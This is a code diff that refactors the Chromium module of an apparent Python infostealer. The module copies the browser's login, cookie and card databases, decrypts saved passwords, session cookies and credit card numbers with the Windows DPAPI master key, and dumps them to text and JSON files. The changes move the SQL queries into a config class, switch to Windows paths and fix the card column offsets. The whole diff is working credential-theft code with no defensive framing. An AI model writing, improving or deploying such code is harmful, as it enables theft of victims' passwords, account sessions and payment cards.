@@ -8,27 +8,31 @@ from datetime import datetime, timedelta
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
+from ..utils.config import ChromiumConfig
+
 
 class Chromium:
 
     def __init__(self, *args):
 
-        variables = ["browser_name", "storage_path", "storage_folder", "state_path", "cookies_path", "passwords_path", "cards_path", "alt_cookies_path", "statuses", "errors"]
+        self.config = ChromiumConfig()
 
-        for index, variable in enumerate(variables):
+        for index, variable in enumerate(self.config.Variables):
             self.__dict__.update({variable: args[index]})
 
     def __check_paths(self):
 
-        if any([path.exists(self.passwords_path), path.exists(self.cookies_path), path.exists(self.alt_cookies_path), path.exists(self.cards_path)]) and any(self.statuses):
-            mkdir(f"{self.storage_path}{self.storage_folder}{self.browser_name}")
+        paths = [path.exists(item) for item in [self.passwords_path, self.cookies_path, self.alt_cookies_path, self.cards_path]]
+
+        if any(paths) and any(self.statuses):
+            mkdir(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}")
 
     def __get_datetime(self, date):
 
-        if date != 86400000000 and date:
+        try:
             return str(datetime(1601, 1, 1) + timedelta(microseconds=date))
-        else:
-            return ""
+        except:
+            return "Can't decode"
 
     def __get_key(self):
 
@@ -44,8 +48,8 @@ class Chromium:
 
     def __write_passwords(self, cursor, master_key):
 
-        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/Passwords.txt", "a", encoding="utf-8") as passwords:
-            for result in cursor.execute("SELECT action_url, username_value, password_value FROM logins").fetchall():
+        with open(rf"{self.storage_path}\{self.storage_folder}\{ self.browser_name}\Passwords.txt", "a", encoding="utf-8") as passwords:
+            for result in cursor.execute(self.config.PasswordsSQL).fetchall():
 
                 password = self.__decrypt(result[2], master_key)
 
@@ -58,7 +62,7 @@ class Chromium:
 
         results = []
 
-        for result in cursor.execute("SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value FROM cookies").fetchall():
+        for result in cursor.execute(self.config.CookiesSQL).fetchall():
 
             if not result[2]:
                 decrypted_value = self.__decrypt(result[6], master_key)
@@ -75,7 +79,7 @@ class Chromium:
                     "expires_datetime": self.__get_datetime(result[5])
                 })
 
-        with open(f"{self.storage_path}{self.storage_folder}/{ self.browser_name}/Cookies.json", "a", encoding="utf-8") as cookies:
+        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Cookies.json", "a", encoding="utf-8") as cookies:
 
             dump(results, cookies)
 
@@ -83,19 +87,19 @@ class Chromium:
 
     def __write_cards(self, cursor, master_key):
 
-        with open(f"{self.storage_path}{self.storage_folder}/{self.browser_name}/Cards.txt", "a", encoding="utf-8") as cards:
-            for result in cursor.execute("SELECT * FROM credit_cards").fetchall():
+        with open(rf"{self.storage_path}\{self.storage_folder}\{self.browser_name}\Cards.txt", "a", encoding="utf-8") as cards:
+            for result in cursor.execute(self.config.CardsSQL).fetchall():
 
-                password = self.__decrypt(result[4], master_key)
+                number = self.__decrypt(result[3], master_key)
 
-                if any(filter(lambda item: item != "", [result[1], result[2], result[3], password])):
-                    cards.write(f"Username: {result[1]}\nNumber: {password}\nExpire Month: {result[2]}\nExpire Year: {result[3]}\n\n")
+                if any(filter(lambda item: item != "", [result[0], result[1], result[2], number])):
+                    cards.write(f"Username: {result[0]}\nNumber: {number}\nExpire Month: {result[1]}\nExpire Year: {result[2]}\n\n")
 
         cards.close()
 
-    def __check_all(self):
+    def __check_functions(self):
 
-        items = (
+        functions = (
             {
                 "status": self.statuses[0],
                 "name": "Passwords",
@@ -122,31 +126,31 @@ class Chromium:
             }
         )
 
-        for item in items:
+        for item in functions:
 
             try:
 
                 if item["status"] is True:
 
                     if (path.exists(item["path"])) is True:
-                        copyfile(item["path"], f'{self.storage_path}{self.browser_name} {item["name"]}.db')
+                        copyfile(item["path"], rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
 
                     elif item["alt_path"] is not None and (path.exists(item["alt_path"])):
-                        copyfile(item["alt_path"], f'{self.storage_path}{self.browser_name} {item["name"]}.db')
+                        copyfile(item["alt_path"], rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
 
                     else:
                         if self.errors is True:
                             print(f'[{self.browser_name.upper()}]: {item["error"]}')
                         return
 
-                    with connect(f'{self.storage_path}{self.browser_name} {item["name"]}.db') as connection:
+                    with connect(rf'{self.storage_path}\{self.browser_name} {item["name"]}.db') as connection:
                         connection.text_factory = lambda text: text.decode(errors="ignore")
                         cursor = connection.cursor()
                         item["method"](cursor, self.__get_key())
                         cursor.close()
 
                     connection.close()
-                    remove(f'{self.storage_path}{self.browser_name} {item["name"]}.db')
+                    remove(rf'{self.storage_path}\{self.browser_name} {item["name"]}.db')
 
             except Exception as e:
 
@@ -158,7 +162,7 @@ class Chromium:
         try:
 
             self.__check_paths()
-            self.__check_all()
+            self.__check_functions()
 
         except Exception as e:
 
